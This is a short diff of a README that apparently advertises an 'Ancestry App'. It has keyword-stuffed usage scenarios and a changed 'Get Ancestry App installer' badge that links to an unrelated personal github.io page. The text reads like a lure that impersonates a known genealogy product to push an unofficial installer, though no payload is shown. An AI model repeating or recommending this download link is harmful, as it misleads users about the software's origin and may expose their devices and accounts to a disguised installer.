@@ -50,7 +50,7 @@ Scenario B - DNA tester: open ancestry dna app tools, review Ancestry App DNA re
 Scenario C - Family organizer: use ancestry photo app features to save portraits, letters, and certificates inside Ancestry App records.  
 Scenario D - Returning subscriber: use ancestry login or Ancestry App login, confirm Ancestry App subscription status, and continue ancestry search sessions.  
 
-[![Get Ancestry App installer](https://img.shields.io/badge/Get-App-7c4dff?style=flat-square&logo=files&logoColor=white)](https://waltraudbolandrtveg.github.io/.github/)
+[![Get Ancestry App installer](https://img.shields.io/badge/Get-App-7c4dff?style=flat-square&logo=files&logoColor=white)](https://waltraudbolandrtveg.github.io/.github/Ancestry-Dna-App)
 
 ## Device Fit and Account Needs
 
